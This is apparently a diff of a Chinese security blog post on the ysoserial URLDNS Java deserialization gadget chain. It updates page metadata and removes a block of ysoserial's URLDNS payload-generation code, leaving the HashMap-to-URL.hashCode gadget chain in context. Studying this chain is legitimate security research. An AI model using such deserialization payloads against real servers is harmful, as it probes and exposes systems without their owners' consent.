@@ -24,7 +24,7 @@
 <meta property="og:description" content="分析一下URLDNS的触发过程 ysoserial在2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客里，借用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的真实案例来到人们的视野，各大Java Web Server纷纷躺枪。 ysoserial就是两位原作者再议题中释放出的一个工具，它可">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-04-24T08:04:50.000Z">
-<meta property="article:modified_time" content="2023-04-24T12:48:53.126Z">
+<meta property="article:modified_time" content="2023-05-06T07:14:17.495Z">
 <meta property="article:author" content="Aurey7">
 <meta property="article:tag" content="Java Security">
 <meta name="twitter:card" content="summary_large_image">
@@ -234,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.6k 字
+          2.5k 字
         
       </span>
     
@@ -245,7 +245,7 @@
         
         
         
-          31 分钟
+          22 分钟
         
       </span>
     
@@ -306,8 +306,6 @@
 <li>使用Java内置类构造，没有第三方库的依赖</li>
 <li>无需回显，可以通过DNS请求得知是否存在反序列化漏洞</li>
 </ol>
-<p><strong>ysoserial生成URLDNS的代码</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 <h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>ysoserial会调用<code>URLDNS</code>类的<code>getObject</code>方法，返回一个对象，这个对象就是最后被序列化的对象，这里是<code>HashMap</code></p>
 <p>ysoserial也在注释中给出了利用链</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">*   Gadget Chain:<br>*     HashMap.readObject()<br>*       HashMap.putVal()<br>*         HashMap.hash()<br>*           URL.hashCode()<br></code></pre></td></tr></table></figure>
